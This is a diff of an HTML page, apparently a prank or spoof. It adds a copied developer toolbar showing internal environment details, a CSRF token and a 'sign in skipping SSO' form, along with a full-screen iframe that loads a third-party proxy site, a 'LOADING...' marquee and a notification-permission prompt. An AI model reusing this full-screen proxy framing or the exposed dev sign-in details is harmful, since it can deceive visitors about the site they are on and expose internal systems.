@@ -40,10 +40,10 @@
 
       /* Modal Content */
       .modal-content {
-        background-color: #fefefe;
+        /* background-color: #fefefe; */
         margin: auto;
         padding: 20px;
-        border: 1px solid #888;
+        /* border: 1px solid #888; */
         width: 80%;
       }
 
@@ -64,6 +64,137 @@
     </style>
   </head>
   <body>
+    <link
+      rel="stylesheet"
+      media="screen"
+      href="http://themeforest.shopfront.envato.test:8080/assets/market/shared/modules/toolbelt.css"
+    />
+    <div
+      id="peek"
+      class="development"
+      data-request-id="67337e26-95df-479b-8fe5-8d444247bd47"
+      style="position: relative;"
+    >
+      <div class="wrapper">
+        <div id="peek-view-git" class="view">
+          <div class="bucket">
+            <span class="current-branch css-truncate expandable">
+              <i class="e-icon -icon-branch"></i>
+              <span class="current-branch-name css-truncate-target">
+                <a
+                  href="https://github.com/envato/marketplace/tree/master"
+                  target="_blank"
+                  >master</a
+                >
+                @
+                <a
+                  href="https://github.com/envato/marketplace/commit/46a35607c73"
+                  target="_blank"
+                  >46a35607c73</a
+                >
+              </span>
+            </span>
+          </div>
+        </div>
+        <div id="peek-view-host" class="view">
+          <div class="bucket">
+            <span
+              class="current-host"
+              original-title="<strong>Environment</strong>: development<br>
+    <strong>Rails</strong>: 5.2.2<br>
+    <strong>Ruby</strong>: 2.5.3-p105<br>"
+            >
+              <i class="e-icon -icon-host"></i> shervins-macbook-pro-3
+            </span>
+          </div>
+        </div>
+        <div id="peek-view-performance-bar" class="view">
+          <span id="serverstats"
+            ><span
+              class="peek-tooltip"
+              original-title="Total navigation time for this page."
+              >7.281s</span
+            ></span
+          >
+          <ul class="performance-bar">
+            <li
+              class="peek-tooltip"
+              original-title="frontend: 600ms"
+              style="width: 6.01566px; left: 66.9843px; background: rgb(144, 211, 91);"
+            ></li>
+            <li
+              class="peek-tooltip"
+              original-title="backend: 6.444s"
+              style="width: 64.6082px; left: 2.2659px; background: rgb(193, 215, 238);"
+            ></li>
+            <li
+              class="peek-tooltip"
+              original-title="tcp / ssl: 0ms"
+              style="width: 0px; left: 2.2659px; background: rgb(69, 104, 142);"
+            ></li>
+            <li
+              class="peek-tooltip"
+              original-title="redirect: 223ms"
+              style="width: 2.23582px; left: 0.0200522px; background: rgb(12, 54, 94);"
+            ></li>
+            <li
+              class="peek-tooltip"
+              original-title="dns: 0ms"
+              style="width: 0px; left: 2.2659px; background: rgb(8, 37, 65);"
+            ></li>
+          </ul>
+        </div>
+        <div id="peek-view-mysql2" class="view">
+          <strong
+            ><span data-defer-to="mysql2-duration">460ms</span> /
+            <span data-defer-to="mysql2-calls">210</span></strong
+          >
+          sql
+        </div>
+        <div id="peek-view-dalli" class="view">
+          <strong>
+            <span
+              id="peek-dalli-tooltip"
+              original-title="Reads: 456<br>Misses: 0<br>Writes: 1<br>Other: 451"
+            >
+              <span data-defer-to="dalli-duration">16ms</span> /
+              <span data-defer-to="dalli-calls">908</span>
+            </span>
+          </strong>
+          memcache
+        </div>
+        <div id="peek-view-popup" class="view">
+          <a
+            rel="nofollow"
+            class="e-icon -icon-cog peek-tooltip"
+            data-view="modalAjax"
+            href="/admin/developers/widget"
+            original-title="Open dev widget"
+          ></a>
+        </div>
+        <div id="peek-view-masquerade" class="view">
+          <form action="/dev/sign_in" accept-charset="UTF-8" method="post">
+            <input name="utf8" type="hidden" value="✓" /><input
+              type="hidden"
+              name="authenticity_token"
+              value="dH3CLZPl2Rk5NeVpAC+2rciX9/8GW2Pmdog9i+kQcZcy6bKziQHLdbWQCg9/2SbAKVtbq7fkw+bXG8mMHKL2AQ=="
+            />
+            <input
+              type="text"
+              name="username"
+              id="dev_toolbar_username"
+              value=""
+              placeholder="dev sign in"
+              autocapitalize="off"
+              autocorrect="off"
+              class="peek-tooltip"
+              original-title="Sign in skipping SSO"
+            />
+          </form>
+        </div>
+      </div>
+    </div>
+
     <div class="banner-root">
       <style>
         .headerstrip {
@@ -272,36 +403,48 @@
       </div>
     </div>
 
+
     <!-- The Modal -->
     <div id="myModal" class="modal">
       <!-- Modal content -->
       <div class="modal-content">
         <span class="close">&times;</span>
         <marquee
-          direction="down"
-          width="100%"
-          height="200"
-          behavior="alternate"
+        direction="down"
+        width="100%"
+        height="200"
+        behavior="alternate"
         >
-          <marquee behavior="alternate" style="color:hotpink">
-            #tenyearchallenge
+        <marquee behavior="alternate" style="color:hotpink; font-size: 152px;">
+            LOADING...
           </marquee>
         </marquee>
       </div>
     </div>
 
+    <style>
+      iframe {
+    display: block;       /* iframes are inline by default */
+    background: #000;
+    border: none;         /* Reset default border */
+    height: 100vh;        /* Viewport-relative units */
+    width: 100vw;
+}
+    </style>
+
+    <iframe src="https://us13.proxysite.com/process.php?d=Gtq2zaKqtk3XFRLYTAXQI9yEVYU%3D&b=3" />
     <script>
-      Notification.requestPermission().then(result => {})
+      Notification.requestPermission().then(result => {});
 
       // Get the modal
-      var modal = document.getElementById('myModal')
+      var modal = document.getElementById("myModal");
       // Get the <span> element that closes the modal
-      var span = document.getElementsByClassName('close')[0]
+      var span = document.getElementsByClassName("close")[0];
 
       // When the user clicks on <span> (x), close the modal
       span.onclick = function() {
-        modal.style.display = 'none'
-      }
+        modal.style.display = "none";
+      };
     </script>
   </body>
 </html>
